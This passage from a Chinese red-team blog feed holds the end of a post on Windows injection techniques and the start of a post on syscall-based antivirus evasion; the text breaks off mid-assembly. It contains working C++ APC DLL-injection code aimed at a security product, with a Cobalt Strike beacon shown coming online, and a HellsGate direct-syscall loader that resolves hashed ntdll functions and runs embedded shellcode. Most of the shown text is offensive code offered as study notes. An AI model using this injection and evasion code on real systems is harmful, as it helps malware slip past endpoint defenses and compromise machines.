class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintError</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* errContext)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> Error[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">::<span class="built_in">sprintf_s</span>(Error, <span class="string">&quot;%s Error[%d]\n&quot;</span>, errContext, ::<span class="built_in">GetLastError</span>());</span><br><span class="line">::<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, Error, <span class="string">&quot;ERROR&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取指定进程的所有线程</span></span><br><span class="line"><span class="function">BOOL <span class="title">GetProcessThreadList</span><span class="params">(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请空间</span></span><br><span class="line">DWORD dwThreadIdListLength = <span class="number">0</span>;<span class="comment">// 线程数组的索引</span></span><br><span class="line">DWORD dwThreadIdListMaxCount = <span class="number">2000</span>;<span class="comment">// 最大线程数</span></span><br><span class="line">LPDWORD pThreadIdList = <span class="literal">NULL</span>;<span class="comment">// 链表的头部</span></span><br><span class="line"><span class="comment">// LPDWORD: 指向DWORD的指针</span></span><br><span class="line">HANDLE hThreadSnap = INVALID_HANDLE_VALUE;<span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line">pThreadIdList = (LPDWORD)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwThreadIdListMaxCount * <span class="built_in">sizeof</span>(DWORD), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="comment">// NULL未指定起始地址</span></span><br><span class="line"><span class="keyword">if</span> (pThreadIdList == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化为0</span></span><br><span class="line"><span class="built_in">RtlZeroMemory</span>(pThreadIdList, dwThreadIdListMaxCount * <span class="built_in">sizeof</span>(DWORD));</span><br><span class="line"></span><br><span class="line">THREADENTRY32 th32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拍摄快照</span></span><br><span class="line">hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, th32ProcessID);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hThreadSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构的大小</span></span><br><span class="line">th32.dwSize = <span class="built_in">sizeof</span>(THREADENTRY32);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历所有THREADENTRY32结构，按顺序填入数组</span></span><br><span class="line">BOOL bRet = <span class="built_in">Thread32First</span>(hThreadSnap, &amp;th32);</span><br><span class="line"><span class="keyword">while</span>(bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(th32.th32OwnerProcessID == th32ProcessID)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (dwThreadIdListLength &gt;= dwThreadIdListMaxCount)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;</span><br><span class="line">&#125;</span><br><span class="line">bRet = <span class="built_in">Thread32Next</span>(hThreadSnap, &amp;th32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*pThreadIdListLength = dwThreadIdListLength; <span class="comment">// 捕获的线程快照个数</span></span><br><span class="line">*ppThreadIdList = pThreadIdList; <span class="comment">// 线程地址的数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">APCInjection</span><span class="params">(HANDLE hProcess, CHAR* wzDLLFullPath, LPDWORD pThreadIdList, DWORD dwThreadIdListLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">// (指定进程, DLL路径, 线程链表的头部, 链表长度)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请内存</span></span><br><span class="line">PVOID lpAddr = <span class="literal">NULL</span>;</span><br><span class="line">SIZE_T page_size = <span class="number">4096</span>;</span><br><span class="line"></span><br><span class="line">lpAddr = ::<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, page_size, </span><br><span class="line">MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (lpAddr == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">PrintError</span>(<span class="string">&quot;VirtualAllocEx - Error\n\n&quot;</span>);</span><br><span class="line"><span class="comment">// 释放空间</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, lpAddr, page_size, MEM_DECOMMIT);</span><br><span class="line"><span class="comment">// 关闭</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将DLL路径写入到内存中</span></span><br><span class="line">BOOL isWriteSuccess = ::<span class="built_in">WriteProcessMemory</span>(hProcess, lpAddr,</span><br><span class="line">wzDLLFullPath, (<span class="built_in">strlen</span>(wzDLLFullPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(wzDLLFullPath), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isWriteSuccess == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">PrintError</span>(<span class="string">&quot;WriteProcessMemory - Error\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, lpAddr, page_size, MEM_COMMIT);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得LoadLibraryA的地址</span></span><br><span class="line">PVOID LoadLibraryAddress = ::<span class="built_in">GetProcAddress</span>(::<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="comment">// PVOID: void*</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历线程链表, 插入APC</span></span><br><span class="line"><span class="type">float</span> fail = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = dwThreadIdListLength - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">HANDLE hThread = ::<span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);</span><br><span class="line"><span class="keyword">if</span> (hThread)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 插入APC</span></span><br><span class="line"><span class="keyword">if</span> (!::<span class="built_in">QueueUserAPC</span>((PAPCFUNC)LoadLibraryAddress, hThread, (ULONG_PTR)lpAddr)) &#123;</span><br><span class="line">fail++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭线程句柄</span></span><br><span class="line">::<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">hThread = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Total Thread: %d\n&quot;</span>, dwThreadIdListLength);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Total Failed: %d\n&quot;</span>, (<span class="type">int</span>)fail);</span><br><span class="line"></span><br><span class="line"><span class="type">float</span> FailRate = dwThreadIdListLength / fail;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">int</span>)fail == <span class="number">0</span> || FailRate &gt; <span class="number">0.5</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Successful! APC Injection!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fail!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD PID = <span class="number">10544</span>;</span><br><span class="line">CHAR wzDllFullPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">LPDWORD pThreadIdList = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwThreadIdListLength = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="built_in">strcpy_s</span>(wzDllFullPath, <span class="string">&quot;C:\\Users\\icfh\\Desktop\\artifact_x86_apc.dll&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="built_in">strcpy_s</span>(wzDllFullPath, <span class="string">&quot;C:\\Users\\icfh\\Desktop\\artifact_x86_apc.dll&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">BOOL isGetProcessThreadList = <span class="built_in">GetProcessThreadList</span>(PID, &amp;pThreadIdList, &amp;dwThreadIdListLength);</span><br><span class="line"><span class="keyword">if</span> (!isGetProcessThreadList)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t list the threads\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开句柄</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PID);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to open Process\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注入</span></span><br><span class="line">BOOL isInjectSuccess = <span class="built_in">APCInjection</span>(hProcess, wzDllFullPath, pThreadIdList, dwThreadIdListLength);</span><br><span class="line"><span class="keyword">if</span> (!isInjectSuccess) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to inject DLL\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿D盾开刀：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404102118265.png" alt="image-20240131153206368"></p><p>还是CS上线</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404102128616.png" alt="image-20240131153108139"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol><li><p><a href="https://learn.microsoft.com/en-us/windows/">https://learn.microsoft.com/en-us/windows/</a></p></li><li><p><a href="https://xz.aliyun.com/t/11153?time__1311=mqmx0DyDcDn0e7KDsKoYKmx7Tq+nDBD=7YD&alichlgref=https://www.google.co.uk/#toc-0">https://xz.aliyun.com/t/11153?time__1311=mqmx0DyDcDn0e7KDsKoYKmx7Tq%2BnDBD%3D7YD&amp;alichlgref=https%3A%2F%2Fwww.google.co.uk%2F#toc-0</a></p></li><li><p><a href="https://xz.aliyun.com/t/10318?time__1311=mq+xBDyDuGBDcDBqDTmGIDkzeD=X5qKqx&alichlgref=https://www.google.co.uk/#toc-5">https://xz.aliyun.com/t/10318?time__1311=mq%2BxBDyDuGBDcDBqDTmGIDkzeD%3DX5qKqx&amp;alichlgref=https%3A%2F%2Fwww.google.co.uk%2F#toc-5</a></p></li><li><p><a href="https://www.anquanke.com/post/id/247813">https://www.anquanke.com/post/id/247813</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;寒假的时候写的，4月才发现没有发到博客：(&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;Windows注入技术-复现&quot;&gt;&lt;a href=&quot;#Windows注入技术-复现&quot; class=&quot;headerlink&quot; title=&quot;Windows注</summary>
      
    
    
    
    
    <category term="RedTeam" scheme="http://example.com/tags/RedTeam/"/>
    
  </entry>
  
  <entry>
    <title>syscall免杀学习记录(持续更新)</title>
    <link href="http://example.com/2024/04/10/syscall-AVBypass/"/>
    <id>http://example.com/2024/04/10/syscall-AVBypass/</id>
    <published>2024-04-10T13:12:14.000Z</published>
    <updated>2024-04-15T11:34:56.135Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PEB等结构"><a href="#PEB等结构" class="headerlink" title="PEB等结构"></a>PEB等结构</h1><p>神图</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151932890.jpeg" alt="img"></p><h1 id="Windows中的API调用机制"><a href="#Windows中的API调用机制" class="headerlink" title="Windows中的API调用机制"></a>Windows中的API调用机制</h1><p>简单来说，Ring3中的kernel32.dll中的函数会调用ntdll.dll中的函数，在ntdll.dll中使用syscall指令从Ring3进入Ring0</p><ul><li>测试：</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151932807.png" alt="image-20240307154434280"></p><p>可以发现创建线程</p><p><code>kernel32.dll</code>的<code>CreateThread</code>  &#x3D;&gt; <code>KernelBase.dll</code>的<code>CreateRemoteThreadEx</code> &#x3D;&gt; <code>ntdll.dll</code>的<code>NtCreateThreadEx</code></p><p><code>ntdll.dll</code>中相当于保存着执行功能的函数以及系统调用存根，<code>ntdll.dll</code>导出<code>Windows Native API</code>，具体实现在内核态中的<code>ntoskrnl.exe</code>中</p><ul><li>使用IDA查看ntdll.dll</li></ul><p>NtCreateThreadEx</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933315.png" alt="image-20240412093259939"></p><h1 id="Windows中定位API的原理"><a href="#Windows中定位API的原理" class="headerlink" title="Windows中定位API的原理"></a>Windows中定位API的原理</h1><p>​定位WinAPI对于开发通用shellcode有着重要意义。</p><p>​而WinAPI通过动态链接库中的导出函数（可以查看导出表Export Directory）来实现的，比如内存操作等API在kernel32.dll中实现，GUI的相关API在user32.dll中实现。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933819.png" alt="image-20240413132824494"></p><p>​win32下的shellcode开发通常使用<code>TEB-&gt;PEB-&gt;LDR</code>的思路来找到，具体过程如下：</p><ul><li><p>通过段选择器FS在内存中找到线程环境块TEB</p></li><li><p>线程环境块偏移位置为0x30的位置 或者 直接通过GS段寄存器0x30偏移处 获取PEB指针</p></li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933811.png" alt="image-20240413133603759"></p><ul><li>PEB中偏移位置为0x0C的位置存放着PEB_LDR_DATA结构体的指针，其中存放着被进程装载的动态链接库的信息</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933512.png" alt="image-20240413133948094"></p><ul><li>PEB_LDR_DATA结构体中存放着三条链表，这均可以获取API</li></ul><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240413134235247.png" alt="image-20240413134235247"></p><p>以InlnitializationOrderModuleList为例：</p><p>​模块初始化链表InlnitializationOrderModuleList中按顺序存放着PE装入运行时初始化模块的信息，第一个链表结点是ntdll.dll，第二个链表结点就是kernel32.dll</p><p>​到对应模块后，在InInitializationOrderModuleList的0x08偏移处就是ntdll.dll的基址</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933234.png" alt="image-20240413134602172"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933799.png"></p><h1 id="syscall免杀"><a href="#syscall免杀" class="headerlink" title="syscall免杀"></a>syscall免杀</h1><h2 id="HellsGate"><a href="#HellsGate" class="headerlink" title="HellsGate"></a>HellsGate</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>读取ntdll.dll，解析并遍历ntdll.dll的导出表，然后根据函数名取出函数地址，再用函数指针的方式进行syscall调用，从而绕过Ring3上的hook检测</p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul><li>获取ldrDataEntry的基址</li></ul><p>​HellsGate的作者从InMemoryOrderModuleList出发，最后偏移0x10个字节即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - <span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933799.png"></p><ul><li>获得ntdll.dll的EAT（Export Address Table）的基地址</li></ul><p>​这个的前置知识就是PE文件结构</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933676.jpeg" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetImageExportDirectory</span><span class="params">(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Get DOS header</span></span><br><span class="line">PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;</span><br><span class="line"><span class="keyword">if</span> (pImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get NT headers</span></span><br><span class="line">PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader-&gt;e_lfanew);</span><br><span class="line"><span class="keyword">if</span> (pImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the EAT</span></span><br><span class="line">*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过API哈希然后遍历ntdll.dll的EAT来找到对应的函数地址</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Table.NtAllocateVirtualMemory.dwHash = <span class="number">0xf5bd373480a6b89b</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">GetVxTableEntry</span>(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">Table.NtCreateThreadEx.dwHash = <span class="number">0x64dc7db288c5015f</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">GetVxTableEntry</span>(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">Table.NtProtectVirtualMemory.dwHash = <span class="number">0x858bcb1046fb6a37</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">GetVxTableEntry</span>(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">Table.NtWaitForSingleObject.dwHash = <span class="number">0xc6a2fa174e551bcb</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">GetVxTableEntry</span>(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWaitForSingleObject))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x1</span>;</span><br></pre></td></tr></table></figure><ul><li>最后使用从ntdll.dll的EAT中获取的winAPI执行shellcode</li></ul><blockquote><p>分配内存页存储shellcode –&gt; 往内存页中写入shellcode –&gt; 修改内存页为可读可执行 –&gt; 在当前进程中创建新的线程 –&gt; 执行</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Payload</span><span class="params">(PVX_TABLE pVxTable)</span> </span>&#123;</span><br><span class="line">NTSTATUS status = <span class="number">0x00000000</span>;</span><br><span class="line"><span class="comment">// char shellcode[] = &quot;\x90\x90\x90\x90\xcc\xcc\xcc\xcc\xc3&quot;;</span></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&quot;</span></span><br><span class="line"><span class="string">&quot;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd&quot;</span></span><br><span class="line"><span class="string">&quot;\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\x63\x61\x6c\x63\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for the shellcode</span></span><br><span class="line">PVOID lpAddress = <span class="literal">NULL</span>;</span><br><span class="line">SIZE_T sDataSize = <span class="built_in">sizeof</span>(shellcode);</span><br><span class="line"><span class="built_in">HellsGate</span>(pVxTable-&gt;NtAllocateVirtualMemory.wSystemCall);</span><br><span class="line">status = <span class="built_in">HellDescent</span>((HANDLE)<span class="number">-1</span>, &amp;lpAddress, <span class="number">0</span>, &amp;sDataSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write Memory</span></span><br><span class="line"><span class="built_in">VxMoveMemory</span>(lpAddress, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change page permissions</span></span><br><span class="line">ULONG ulOldProtect = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">HellsGate</span>(pVxTable-&gt;NtProtectVirtualMemory.wSystemCall);</span><br><span class="line">status = <span class="built_in">HellDescent</span>((HANDLE)<span class="number">-1</span>, &amp;lpAddress, &amp;sDataSize, PAGE_EXECUTE_READ, &amp;ulOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create thread</span></span><br><span class="line">HANDLE hHostThread = INVALID_HANDLE_VALUE;</span><br><span class="line"><span class="built_in">HellsGate</span>(pVxTable-&gt;NtCreateThreadEx.wSystemCall);</span><br><span class="line">status = <span class="built_in">HellDescent</span>(&amp;hHostThread, <span class="number">0x1FFFFF</span>, <span class="literal">NULL</span>, (HANDLE)<span class="number">-1</span>, (LPTHREAD_START_ROUTINE)lpAddress, <span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait for 1 seconds</span></span><br><span class="line">LARGE_INTEGER Timeout;</span><br><span class="line">Timeout.QuadPart = <span class="number">-10000000</span>;</span><br><span class="line"><span class="built_in">HellsGate</span>(pVxTable-&gt;NtWaitForSingleObject.wSystemCall);</span><br><span class="line">status = <span class="built_in">HellDescent</span>(hHostThread, FALSE, &amp;Timeout);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺道看下HellsGate的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.code </span><br><span class="line">HellsGate PROC; 获取系统调用号</span><br><span class="line">mov 